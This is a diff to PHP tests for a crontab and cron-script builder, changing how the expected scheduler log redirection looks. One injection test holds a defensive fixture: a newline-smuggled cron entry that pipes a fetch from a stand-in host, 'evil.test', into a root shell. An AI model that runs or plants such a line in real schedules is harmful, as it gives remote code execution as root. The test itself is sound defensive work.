@@ -68,7 +68,7 @@ test('a crontab carries the resolved runtime path and logs to the scheduler log'
     $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);
 
     expect(app(CrontabBuilder::class)->build($app))->toContain('PATH=/opt/asdf-data/installs/php/8.5.5/bin')
-        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toEndWith("} >> '/var/coresmith/apps/my-app/shared/logs/scheduler.log' 2>&1\n");
+        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toStartWith("exec >> '/var/coresmith/apps/my-app/shared/logs/scheduler.log' 2>&1\n");
 });
 
 test('a cron command containing a newline stays in its script and cannot add cron entries', function () {
@@ -77,7 +77,7 @@ test('a cron command containing a newline stays in its script and cannot add cro
 
     expect(substr_count($crontab, "\n"))->toBe(2)
         ->and($crontab)->not->toContain('evil.test')
-        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toContain("\nok\n* * * * * root curl evil.test|sh\n}");
+        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toBe("exec >> '/var/coresmith/apps/my-app/shared/logs/scheduler.log' 2>&1\n{\nok\n* * * * * root curl evil.test|sh\n} < /dev/null\n");
 });
 
 test('a malformed cron schedule is refused', function () {
